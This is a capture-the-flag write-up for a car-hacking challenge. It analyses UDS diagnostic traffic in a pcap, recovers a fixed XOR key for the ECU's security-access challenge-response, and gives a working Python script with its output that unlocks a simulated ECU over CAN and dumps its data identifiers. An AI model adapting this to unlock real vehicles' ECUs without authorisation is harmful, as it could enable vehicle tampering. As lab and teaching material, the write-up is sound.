## Recon  
initial recon same as for all OBD Tuning (see our OBD Tuning 2
[writeup](https://ctftime.org/writeup/23318))

## Analysis of the pcap  
in the provided pcap dump with a bit car hacking knowledge one can see some
[UDS](https://en.wikipedia.org/wiki/Unified_Diagnostic_Services) commands
going on.  
intresting for OBD-Tuning-1 are the CANid 0x600 and 0x641 (tx/rx)  
one can see following procedure in the dump:

* 10 02 means "init diagnostic session"  
* 27 01 is security access "send challenge"  
* 27 02 is security access "response"  
* 22 00 00 is read Data By CommonIdentifier, you can read various infos from the ECU

those commands are wrapped in [ISO-
TP](https://en.wikipedia.org/wiki/ISO_15765-2) as underlying transport
protocol.  
also you can see in the dump the recevied data on identifier 0x00 is
```Flag.is.on.id.0x42```

## Task  
so the job is:  
* find a valid login to the ECU  
* read CommonIdentifier 0x42 for the flag

in actual cars for the security challenge/response process there is some kind
of micro definition language, which  
describes the operations to be performed on the challenge for a valid response
(this is basic stuff like ADD, SUB, XOR, small loops etc.)  
so its also always worth to test for simple and basic operations like an add
or xor.

and indeed when you use the valid challenge-response pair you got from the
pcap

```  
1012 6701 6813c2df8172ecf3988efc3a9cf1520e  
         xor  
1012 2702 5c21f6edb540d8c1acbcc808a8c3663c  
         =  
         34323432343234323432343234323432  
```  
it seems as key for the respone ```34323432343234323432343234323432``` was
used ("424242...")

## Attack  
so we know what to do: login with a challenge/response where we xor the
challenge with our found key and then read identifier 0x42 (someone really
likes 42)  
a quick hacked python script, did the job:

```python  
SOL_CAN_ISOTP = 106 # These constants exist in the module header, not in
Python.  
CAN_ISOTP_RECV_FC = 2  
# Many more exists.

import socket  
import struct  
import time

def hexdump(data):  
output = ""  
for i in range(0,len(data),2):  
 value =  int(data[i:i+2],16)  
 if value > 0x20 and value < 0x80:  
  output += chr(value)  
 else:  
  output += "."  
return(output)  
  
# init sockets  
s2 = socket.socket(socket.AF_CAN, socket.SOCK_DGRAM, socket.CAN_ISOTP)  
s2.bind(("vcan0", 0x0641, 0x0600)) #rxid, txid with confusing order.

# init diag session UDS: 10 02  
s2.send(b"\x10\x02")  
data = s2.recv(4095)  
print("answer to 0x10: " + hex(data[0]) )

# security access request challenge UDS 27 01  
print("sending get challenge (27 01)")  
s2.send(b"\x27\x01")  
data = s2.recv(4095)  
dump = ''.join("%02X" % _ for _ in data)  
print("answer to 27 01: " + dump + " " + hexdump(dump) )

num = int(dump[4:],16)  
print("chal: " + hex(num))

# calculate response  
resp = num ^ 0x34323432343234323432343234323432  
print("resp: " + hex(resp))

# send back  
s2.send(b"\x27\x02" + bytes.fromhex(hex(resp)[2:]) )  
data = s2.recv(4095)

# unlocked, now dump all readDataByCommonIdentifier (not to miss anything)  
print("dumping all common identifier Data")  
  
for i in range(256):  
s2.send(b"\x22\x00" + chr(i).encode())  
data = s2.recv(4095)  
dump = ''.join("%02X" % _ for _ in data)  
print("answer to 0x22 00 %02X" % i + ": " + dump + " " + hexdump(dump) )

```  
and so the ECU gave us the flag

```  
obd@obd-tuning-ecus:/home/obd$ python3 obd1.py  
answer to 0x10: 0x50  
sending get challenge (27 01)  
answer to 27 01: 670167987F8A8248B127A411253FE49EB8EE g.g..H.'..%?....  
chal: 0x67987f8a8248b127a411253fe49eb8ee  
resp: 0x53aa4bb8b67a85159023110dd0ac8cdc  
dumping all common identifier Data  
answer to 0x22 00 00: 620000466C6167206973206F6E2069642030783432
b..Flag.is.on.id.0x42  
answer to 0x22 00 01: 7F2231"1  
...  
answer to 0x22 00 40: 7F2231"1  
answer to 0x22 00 41: 7F2231"1  
answer to 0x22 00 42:
620042414C4C45537B653473795F53345F31735F7468335F736831747D
b.BALLES{e4sy_S4_1s_th3_sh1t}  
answer to 0x22 00 43: 7F2231"1  
...  
```

## ALLES{e4sy_S4_1s_th3_sh1t}  
macz